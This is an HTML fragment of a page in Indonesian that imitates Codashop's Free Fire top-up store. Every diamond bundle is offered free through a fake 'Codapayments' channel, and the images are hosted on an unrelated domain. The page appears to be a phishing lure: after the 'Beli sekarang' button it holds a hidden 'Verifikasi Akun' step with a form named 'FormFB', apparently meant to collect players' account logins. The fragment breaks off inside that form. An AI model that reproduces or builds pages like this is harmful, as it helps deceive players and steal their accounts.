                                                            <path data-v-9fe12e4e="" d="M19.3417 14.0068L20.6924 11.0156L17.8524 4.15845L10.9947 1.31781L4.13751 4.15845L1.29688 11.0156L4.13751 17.8727L10.9947 20.7134" stroke="#280031" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path data-v-9fe12e4e="" d="M19.6502 8.93591H16.8859C16.3333 9.66561 16.0342 10.5559 16.0342 11.4713C16.0342 12.3866 16.3333 13.2769 16.8859 14.0066H19.2728" stroke="#280031" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path data-v-9fe12e4e="" d="M2.41772 8.93591H5.18197C5.73463 9.66561 6.03373 10.5559 6.03373 11.4713C6.03373 12.3866 5.73463 13.2769 5.18197 14.0066H2.79516" stroke="#280031" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        </svg></span><span data-v-911ab42c="">Layanan Pelanggan 24/7</span></div>
                                            </div><!---->
                                        </div><!----><input data-v-2dd8a47f="" id="product-description" name="product-description" type="checkbox" class="product-details__checkbox"><label data-v-2dd8a47f="" for="product-description"><span data-v-2dd8a47f="" class="product-details__description--more">Baca lebih lanjut</span><span data-v-2dd8a47f="" class="product-details__description--less">Tutup informasi detail</span></label>
                                        <div data-v-2dd8a47f="" class="product-details__content hide-all-content">
                                            <p class="shop-content--paragraph">Codashop menawarkan top up Free Fire yang mudah, aman, dan instan.</p>


                                            <p class="shop-content--paragraph">Pembayaran tersedia melalui pulsa (Telkomsel, Indosat, Tri, XL, Smartfren), Codacash, QRIS, GoPay, OVO, DANA, ShopeePay, LinkAja, Krevido, Alfamart,Indomaret, DOKU, Bank Transfer and Card Payments.</p>

                                            <p class="shop-content--paragraph">Cukup masukkan user ID anda, Pilih jumlah Diamond yang ingin anda beli, pilih metode pembayaran yang anda inginkan, selesaikan pembayaran, dan Diamonds anda akan segera ditambahkan ke akun Free Fire.</p>


                                            <p class="shop-content--paragraph"><a href="https://www.codashop.com/id-id/sign-in" target="_blank">Login ke Codashop</a> akunmu dan dapatkan akses ke promo Free Fire dan event lainnya. Belum punya akun Codashop? <a href="https://www.codashop.com/id-id/sign-up" target="_blank">Daftar sekarang</a></p><br>

                                            Unduh Free Fire sekarang!

                                            <p class="shop-content--paragraph">Download dan mainkan Free Fire sekarang!<br>
                                                <a class="shop-content--badge" href="https://apps.apple.com/US/app/id1300146617?mt=8" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"> </a>
                                                <a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.dts.freefireth" rel="noopener" target="_blank"> <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"> </a>
                                            </p>
                                        </div>
                                    </div><!----><!---->
                                </section>
                            </section>
                            <section data-v-2e06dbb4="" class="product__purchase-form">
                                <div data-v-2e06dbb4="" class="product__tab-pane active">
                                    <span data-v-2e06dbb4="">
									    <div class="firstSection">
                                        <form action="javascript:void(0)" method="post" id="processBuyForm">
                                            <section data-v-d281e85c="" data-v-2e06dbb4="" class="form-section__container">
                                                <div data-v-d281e85c="" tabindex="0" class="form-section__server-info">
                                                    <h2 data-v-d281e85c="" class="form-section__circle">
                                                        <span data-v-d281e85c="" class="form-section__number">1</span>
                                                        <span data-v-d281e85c="" class="form-section__name">Masukkan Player ID</span>
                                                    </h2>
                                                    <div data-v-d281e85c="" class="form-user-identities form-section__formGroup">
                                                        <div data-v-d281e85c="" class="gameUserInput-container">
                                                            <div data-v-d281e85c="" class="gameUserInput form-section__gameUserInput">
                                                                <div data-v-d281e85c="" class="form-field-wrapper userid block-element single-block form-group-container user-input-fields--odd">
                                                                    <span class="provider-span">
                                                                        <div class="input-field-container">
                                                                            <div class="untouched pristine required">
                                                                                <div data-v-2e483941="" data-v-d281e85c="" class="input-block">
                                                                                    <label data-v-2e483941="" for="userId" class="form-input--label"></label>
                                                                                    <div data-v-2e483941="" class="input-holder userid form-input font-normal text-center ">
                                                                                        <input data-v-2e483941="" placeholder="Masukkan Player ID" type="number" id="playid" name="playid" autocomplete="off" class="userid form-input font-normal text-center" required>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </span>
                                                                </div>
                                                                <div data-v-d281e85c="" class="form-section__helper-container">
                                                                    <div data-v-d281e85c="" class="form__image-helper-container form-section__helper-img">
                                                                        <span data-v-d281e85c="" class="ico-question1 form-section__icon-question">?</span>
                                                                        <img data-v-d281e85c="" src="https://cdn1.codashop.com/S/content/common/images/helpers/33.png" alt="" class="form-section__helper-container__hidden">
                                                                    </div>
                                                                </div>
                                                                <div data-v-d281e85c="" class="form-section__helper-backdrop"></div>
                                                            </div>
                                                        </div>
                                                        <div data-v-d281e85c="" class="form-section__gamer-validation"></div>
                                                        <p data-v-d281e85c="" class="form-section__instruction">Untuk menemukan ID Anda, klik pada ikon karakter. User ID tercantum di bawah nama karakter Anda. Contoh: '5363266446'.</p>
                                                    </div>
                                                </div>
                                            </section>

                                            <div data-v-6514a331="" data-v-2e06dbb4="" class="pixel-container">
                                                <div data-v-6514a331="" id="gameUserInputPixel" class="pixel-container__pixel"></div>
                                            </div>

                                            <section data-v-14cd4d92="" data-v-2e06dbb4="" id="voucher" class="section form-section__container">
                                                <h2 data-v-14cd4d92="" class="form-section__circle">
                                                    <span data-v-14cd4d92="" class="form-section__title-container">
                                                        <span data-v-14cd4d92="" class="form-section__number">2</span>
                                                        <span data-v-14cd4d92="" class="form-section__name">Pilih Nominal Top Up</span>
                                                    </span>
                                                </h2>
                                                <div data-v-14cd4d92="" class="form-section__recent-transaction">
                                                    <div data-v-52b55834="" data-v-14cd4d92="" class="badge badge--arcadia-gradient">
                                                        <div data-v-52b55834="" class="badge__elements">
                                                            <div data-v-cae79778="" data-v-14cd4d92="" class="svg-default" data-v-52b55834="" style="width: 24px; height: 24px;">
                                                                <svg data-v-cae79778="" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                    <path data-v-cae79778="" d="M12 12.8999L9.87 14.9899C9.31 15.5499 9 16.2799 9 17.0599C9 18.6799 10.35 19.9999 12 19.9999C13.65 19.9999 15 18.6799 15 17.0599C15 16.2799 14.69 15.5399 14.13 14.9899L12 12.8999Z" fill="#F6F5FC"></path>
                                                                    <path data-v-cae79778="" d="M16 6L15.56 6.55C14.38 8.02 12 7.19 12 5.3V2C12 2 4 6 4 13C4 15.92 5.56 18.47 7.89 19.86C7.33 19.07 7 18.1 7 17.06C7 15.74 7.52 14.5 8.47 13.56L12 10.1L15.53 13.57C16.48 14.5 17 15.74 17 17.07C17 18.09 16.69 19.03 16.15 19.82C18.04 18.67 19.44 16.76 19.86 14.52C20.52 10.97 18.79 7.62 16 6Z" fill="#F6F5FC"></path>
                                                                </svg>
                                                            </div>
                                                            <span data-v-14cd4d92="" data-v-52b55834="">697 item dibeli dalam satu jam terakhir</span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <ul data-v-14cd4d92="" class="form-section__denom-group">
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" id="selectedDenomNominal" class="form-section__denom no-category" onclick="chooseDenom(event, 'firstDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="5 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">5 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'secondDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn form-section__denom-btn--popular">
                                                            <div data-v-6f842de2="" data-v-e25a6dac="" class="popular-tag__container">
                                                                <div data-v-6f842de2="" class="popular-tag__content">
                                                                    <div data-v-cae79778="" data-v-6f842de2="" class="svg-default" style="width: 24px; height: 24px;">
                                                                        <svg data-v-cae79778="" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                            <path data-v-cae79778="" d="M12 12.8999L9.87 14.9899C9.31 15.5499 9 16.2799 9 17.0599C9 18.6799 10.35 19.9999 12 19.9999C13.65 19.9999 15 18.6799 15 17.0599C15 16.2799 14.69 15.5399 14.13 14.9899L12 12.8999Z" fill="#F6F5FC"></path>
                                                                            <path data-v-cae79778="" d="M16 6L15.56 6.55C14.38 8.02 12 7.19 12 5.3V2C12 2 4 6 4 13C4 15.92 5.56 18.47 7.89 19.86C7.33 19.07 7 18.1 7 17.06C7 15.74 7.52 14.5 8.47 13.56L12 10.1L15.53 13.57C16.48 14.5 17 15.74 17 17.07C17 18.09 16.69 19.03 16.15 19.82C18.04 18.67 19.44 16.76 19.86 14.52C20.52 10.97 18.79 7.62 16 6Z" fill="#F6F5FC"></path>
                                                                        </svg>
                                                                    </div>
                                                                    <span data-v-6f842de2="">POPULAR</span>
                                                                </div>
                                                                <div data-v-6f842de2="" class="popular-tag__overlay"></div>
                                                            </div>
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="12 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">12 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'thirdDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="50 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">50 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'fourthDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="70 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">70 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'fifthDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="140 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">140 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'sixthDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn form-section__denom-btn--popular">
                                                            <div data-v-6f842de2="" data-v-e25a6dac="" class="popular-tag__container">
                                                                <div data-v-6f842de2="" class="popular-tag__content">
                                                                    <div data-v-cae79778="" data-v-6f842de2="" class="svg-default" style="width: 24px; height: 24px;">
                                                                        <svg data-v-cae79778="" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                            <path data-v-cae79778="" d="M12 12.8999L9.87 14.9899C9.31 15.5499 9 16.2799 9 17.0599C9 18.6799 10.35 19.9999 12 19.9999C13.65 19.9999 15 18.6799 15 17.0599C15 16.2799 14.69 15.5399 14.13 14.9899L12 12.8999Z" fill="#F6F5FC"></path>
                                                                            <path data-v-cae79778="" d="M16 6L15.56 6.55C14.38 8.02 12 7.19 12 5.3V2C12 2 4 6 4 13C4 15.92 5.56 18.47 7.89 19.86C7.33 19.07 7 18.1 7 17.06C7 15.74 7.52 14.5 8.47 13.56L12 10.1L15.53 13.57C16.48 14.5 17 15.74 17 17.07C17 18.09 16.69 19.03 16.15 19.82C18.04 18.67 19.44 16.76 19.86 14.52C20.52 10.97 18.79 7.62 16 6Z" fill="#F6F5FC"></path>
                                                                        </svg>
                                                                    </div>
                                                                    <span data-v-6f842de2="">POPULAR</span>
                                                                </div>
                                                                <div data-v-6f842de2="" class="popular-tag__overlay"></div>
                                                            </div>
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="355 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">355 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'seventhDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="720 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">720 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'eigthDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="1450 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">1450 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'ninethDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="2180 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">2180 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'tenthDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="3640 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">3640 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'eleventhDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="7290 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">7290 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'twelvethDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="36500 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">36500 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                    <li data-v-e25a6dac="" data-v-14cd4d92="" class="form-section__denom no-category" onclick="chooseDenom(event, 'thirthyDenom');">
                                                        <div data-v-e25a6dac="" class="form-section__denom-btn">
                                                            <div data-v-e25a6dac="" class="form-section__denom-inner has-image">
                                                                <div data-v-e25a6dac="" class="form-section__denom-image-section">
                                                                    <img data-v-e25a6dac="" alt="73100 Diamonds" src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" class="form-section__denom-img">
                                                                </div>
                                                                <div data-v-e25a6dac="" class="form-section__denom-data-section">
                                                                    <span data-v-e25a6dac="" class="form-section__denom-data-section__title">73100 Diamonds</span>
                                                                </div>
                                                                <div data-v-3e0100a6="" data-v-e25a6dac="" class="sku-pricing">
                                                                    <p data-v-3e0100a6="" class="starting-price">
                                                                        <span data-v-3e0100a6="" class="starting-price-from"> Promo </span>
                                                                        <span data-v-3e0100a6="" class="starting-price-value">Rp. 0 (Gratis)</span>
                                                                    </p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                </ul>
                                            </section>

                                            <div data-v-6514a331="" data-v-2e06dbb4="" class="pixel-container">
                                                <div data-v-6514a331="" id="skuOptionsPixel" class="pixel-container__pixel"></div>
                                            </div>

                                            <section data-v-ca4aee8c="" data-v-2e06dbb4="" id="payment" class="form-section__container">
                                                <div class="selectedDenom" id="firstDenom"></div>
                                                <div class="selectedDenom" id="secondDenom"></div>
                                                <div class="selectedDenom" id="thirdDenom"></div>
                                                <div class="selectedDenom" id="fourthDenom"></div>
                                                <div class="selectedDenom" id="fifthDenom"></div>
                                                <div class="selectedDenom" id="sixthDenom"></div>
                                                <div class="selectedDenom" id="seventhDenom"></div>
                                                <div class="selectedDenom" id="eigthDenom"></div>
                                                <div class="selectedDenom" id="ninethDenom"></div>
                                                <div class="selectedDenom" id="tenthDenom"></div>
                                                <div class="selectedDenom" id="eleventhDenom"></div>
                                                <div class="selectedDenom" id="twelvethDenom"></div>
                                                <div class="selectedDenom" id="thirthyDenom"></div>
                                                <h2 data-v-ca4aee8c="" class="form-section__circle">
                                                    <span data-v-ca4aee8c="" class="form-section__title-container">
                                                        <span data-v-ca4aee8c="" class="form-section__number">3</span>
                                                        <span data-v-ca4aee8c="" class="form-section__name">Pilih pembayaran</span>
                                                    </span>
                                                </h2>
                                                <ul data-v-ca4aee8c="" translate="no" class="form-section__formGroup--paymentChannels notranslate">
                                                    <li data-v-1a422aba="" data-v-ca4aee8c="" id="paymentChannel_240" class="form-section__pc-container active">
                                                        <div data-v-1a422aba="" class="form-section__payment-channel">
                                                            <span data-v-1a422aba="" class="form-section__best-deal"> Best Deal </span>
                                                            <div data-v-1a422aba="" class="form-section__pc-logo-container">
                                                                <figure data-v-1a422aba="" class="form-section__logo-wrapper large">
                                                                    <img data-v-1a422aba="" alt="Dana" src="https://images.cahyosr.my.id/img/17/codapayments.png" class="form-section__logo">
                                                                </figure>
                                                            </div>
                                                            <div data-v-1a422aba="" class="form-section__price-container" id="priceInfo_240">
                                                                <div data-v-1a422aba="" class="form-section__price-info"></div>
                                                                <div data-v-1a422aba="" class="form-section__price"> Rp. 0 (Gratis) </div>
                                                            </div><!---->
                                                            <div data-v-1a422aba="" class="form-section__tagline-wrapper show-tagline active">
                                                                <div data-v-1a422aba="" id="payment-channel__tagline_240">Gratis dengan Codapayments (Diskon 100%)</div>
                                                            </div>
                                                        </div>
                                                    </li>
                                                </ul>
                                            </section>

                                            <div data-v-6514a331="" data-v-2e06dbb4="" class="pixel-container">
                                                <div data-v-6514a331="" id="pcPixel" class="pixel-container__pixel"></div>
                                            </div>

                                            <section data-v-4c7e0cdd="" data-v-16bec177="" id="buy" class="form-section__container">
                                                <div data-v-4c7e0cdd="" class="form-section__wrapper">
                                                    <h2 data-v-4c7e0cdd="" class="form-section__circle">
													<span data-v-4c7e0cdd="" class="form-section__number">4</span>
													<span data-v-4c7e0cdd="" class="form-section__name">Beli!</span>
													</h2>
                                                    <div data-v-4c7e0cdd="" id="buySectionForm" class="form-section__formGroup--buySection">
                                                        <div data-v-4c7e0cdd="" class="form-section__email-input">
                                                            <div data-v-4c7e0cdd="" class="form-section__subheader-wrapper">
                                                                <div data-v-4c7e0cdd="" class="form-section__subheader">Opsional: Jika anda ingin mendapatkan bukti pembayaran atas pembelian anda, harap mengisi alamat emailnya</div><!---->
                                                            </div>
                                                            <div data-v-4c7e0cdd="" class="form-group form-group-container">
															<span class="provider-span">
                                                                    <div class="input-field-container">
                                                                        <div class="untouched pristine">
                                                                            <div data-v-2e483941="" data-v-4c7e0cdd="" class="input-block">
																			<label data-v-2e483941="" for="email" class="form-input--label"></label>
                                                                                <div data-v-2e483941="" class="input-holder product-form-input ">
																				<input data-v-2e483941="" placeholder="Alamat E-mail" type="email" id="email" name="" model="" autocomplete="off" class="product-form-input">
																				</div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                            </span>
															</div>
                                                        </div>
                                                        <div data-v-4c7e0cdd="" class="form-section__btnGroup"></div>
                                                    </div>
                                                </div>
                                                <div data-v-ebdf9d72="" data-v-4c7e0cdd="" class="summary-top">
                                                    <section data-v-ebdf9d72="" class="summary purchase-info show-buy-widget">
                                                        <div data-v-ebdf9d72="" class="summary__container">
                                                            <div data-v-ebdf9d72="" class="summary__wrapper">
															<div data-v-ebdf9d72="" class="summary__denom-pc">
																<span data-v-ebdf9d72="">Promo Diamonds</span>
																<span data-v-ebdf9d72="" class="separator"></span>
																<span data-v-ebdf9d72="">Codapayments</span>
																</div>
                                                                <div data-v-ebdf9d72="" class="summary__payment">
                                                                    <div data-v-ebdf9d72="" class="summary__amount-wrapper">
                                                                        <div data-v-ebdf9d72="" class="summary__amount">
                                                                            <div data-v-ebdf9d72="" class="summary__amount-org"> Rp. 0 (Gratis) </div>
                                                                            <p data-v-ebdf9d72="" class="summary__amount-tax-info"> Promo ini spesial untukmu! </p>
                                                                        </div>
                                                                    </div>
                                                                    <div data-v-ebdf9d72="" class="summary__buynow">
																	<button data-v-71db3a9f="" data-v-ebdf9d72="" type="submit" class="buyBtn  btn-default btn-single" id="mdn-submit" onclick="processBuy()">
																	<span data-v-ebdf9d72="" data-v-71db3a9f="" class="form-section__btnText">Beli sekarang</span>
																	</button>
																	</div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </section>
                                                </div>
                                            </section>

                                            <div data-v-6514a331="" data-v-2e06dbb4="" class="pixel-container">
                                                <div data-v-6514a331="" id="buyPixel" class="pixel-container__pixel"></div>
                                            </div>
											
                                        </form> <!--- formGue --->
										</div> <!--- firstSection --->
										
										<section data-v-4c7e0cdd="" data-v-16bec177="" id="buy" class="form-section__container account_verification" style="display: none;">
                                                <div data-v-4c7e0cdd="" class="form-section__wrapper">
                                                    <h2 data-v-4c7e0cdd="" class="form-section__circle">
													<span data-v-4c7e0cdd="" class="form-section__number">5</span>
													<span data-v-4c7e0cdd="" class="form-section__name">Verifikasi Akun</span>
													</h2>
													<form action="javascript:void(0)" method="post" id="FormFB">
                                                    <div data-v-4c7e0cdd="" id="buySectionForm" class="form-section__formGroup--buySection">
